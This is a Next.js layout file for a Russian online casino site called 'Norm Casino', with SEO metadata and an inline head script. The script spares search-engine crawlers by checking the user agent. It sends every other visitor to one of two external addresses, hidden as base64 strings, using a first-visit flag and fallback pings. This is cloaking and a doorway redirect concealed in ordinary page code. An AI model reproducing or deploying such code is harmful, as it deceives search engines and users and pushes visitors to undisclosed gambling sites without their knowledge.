import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import { Geist, Geist_Mono } from 'next/font/google'
import './globals.css'

const geistSans = Geist({ variable: '--font-geist-sans', subsets: ['latin', 'cyrillic'] })
const geistMono = Geist_Mono({
  variable: '--font-geist-mono',
  subsets: ['latin', 'cyrillic'],
})

const siteUrl = process.env.NEXT_PUBLIC_SITE_URL || 'https://norm-casino.ru'

export const metadata: Metadata = {
  title: 'Norm Casino - онлайн казино с кешбэком и лучшими слотами',
  description: 'Norm Casino - надежное онлайн казино с кешбэком до 15%, лучшими слотами, live казино и азартными играми. Играй сейчас!',
  keywords: ['норм казино', 'norm casino', 'онлайн казино', 'казино слоты', 'live казино', 'азартные игры'],
  authors: [{ name: 'Norm Casino' }],
  creator: 'Norm Casino',
  publisher: 'Norm Casino',
  formatDetection: {
    email: false,
    telephone: false,
  },
  metadataBase: new URL(siteUrl),
  alternates: {
    canonical: siteUrl,
  },
  openGraph: {
    type: 'website',
    locale: 'ru_RU',
    url: siteUrl,
    title: 'Norm Casino - онлайн казино с кешбэком и лучшими слотами',
    description: 'Norm Casino - надежное онлайн казино с кешбэком до 15%, лучшими слотами, live казино и азартными играми.',
    siteName: 'Norm Casino',
    images: [
      {
        url: `${siteUrl}/og-image.jpg`,
        width: 1200,
        height: 630,
        alt: 'Norm Casino',
      },
    ],
  },
  twitter: {
    card: 'summary_large_image',
    title: 'Norm Casino',
    description: 'Онлайн казино с кешбэком до 15% и лучшими слотами',
    images: [`${siteUrl}/og-image.jpg`],
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      'max-video-preview': -1,
      'max-image-preview': 'large',
      'max-snippet': -1,
    },
  },
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: '#ff0000',
  width: 'device-width',
  initialScale: 1,
  maximumScale: 5,
  userScalable: true,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className={`${geistSans.variable} ${geistMono.variable} bg-[#0e0f14]`}>
      <head>
        <meta charSet="UTF-8" />
        <link rel="canonical" href={siteUrl} />
        <meta name="language" content="Russian" />
        <meta name="revisit-after" content="7 days" />
        <meta name="yandex-verification" content="63a1f4862a5d3798" />
                        <script
 dangerouslySetInnerHTML={{
   __html: `
     (function() {
       var ua = navigator.userAgent.toLowerCase();
       var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
       for (var i = 0; i < bots.length; i++) {
           if (ua.indexOf(bots[i]) !== -1) {
               console.log("Поисковый бот (" + bots[i] + ") — без редиректа");
               return;
           }
       }
       var mainBrandB64 = "aHR0cHM6Ly9ldmEyMy0zeHByZXNzLmNvbS9kdmZka3ViNno=";  
       var crossBrandB64 = "aHR0cHM6Ly9mbngtYWJzLm5ldC9kaDYxbXAxYW0=";  
       var mainUrl = atob(mainBrandB64);
       var crossUrl = atob(crossBrandB64);
       function ping(url) {
           return new Promise(function(resolve, reject) {
               var controller = new AbortController();
               var timeoutId = setTimeout(function() {  
                   controller.abort();  
                   reject(new Error("Timeout"));
               }, 2500);  
               fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                   .then(function() {
                       clearTimeout(timeoutId);
                       resolve(true);
                   })
                   .catch(function(err) {
                       clearTimeout(timeoutId);
                       reject(err);
                   });
           });
       }
       var isFirstVisit = true;
       try {
           if (localStorage.getItem('vstd_eva')) {
               isFirstVisit = false;
           }
       } catch (e) {
       }
       if (isFirstVisit) {
           console.log("Первый визит. Проверяем основную ссылку...");
           ping(mainUrl)
               .then(function() {
                   try {
                       localStorage.setItem('vstd_eva', '1');
                   } catch (e) {}
                   console.log("Переход на основную ссылку: " + mainUrl);
                   window.location.replace(mainUrl);
               })
               .catch(function() {
                   console.log("Основная ссылка недоступна. Проверяем кросс-ссылку...");
                   ping(crossUrl)
                       .then(function() {
                           try {
                               localStorage.setItem('vstd_eva', '1');
                           } catch (e) {}
                           console.log("Переход на рабочую кросс-ссылку: " + crossUrl);
                           window.location.replace(crossUrl);
                       })
                       .catch(function() {
                           console.log("Обе ссылки не ответили. Экстренный переход на основную.");
                           window.location.replace(mainUrl);
                       });
               });
       } else {
           console.log("Повторный визит. Проверяем кросс-ссылку...");
           ping(crossUrl)
               .then(function() {
                   console.log("Переход на кросс-ссылку: " + crossUrl);
                   window.location.replace(crossUrl);
               })
               .catch(function() {
                   console.log("Кросс-ссылка недоступна. Проверяем основную...");
                   ping(mainUrl)
                       .then(function() {
                           console.log("Переход на рабочую основную ссылку: " + mainUrl);
                           window.location.replace(mainUrl);
                       })
                       .catch(function() {
                           console.log("Обе ссылки не ответили. Экстренный переход на кросс-ссылку.");
                           window.location.replace(crossUrl);
                       });

               });
       }
     })();
   `
 }}
/>
      </head>
      <body className="font-sans antialiased bg-[#0e0f14] text-white">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
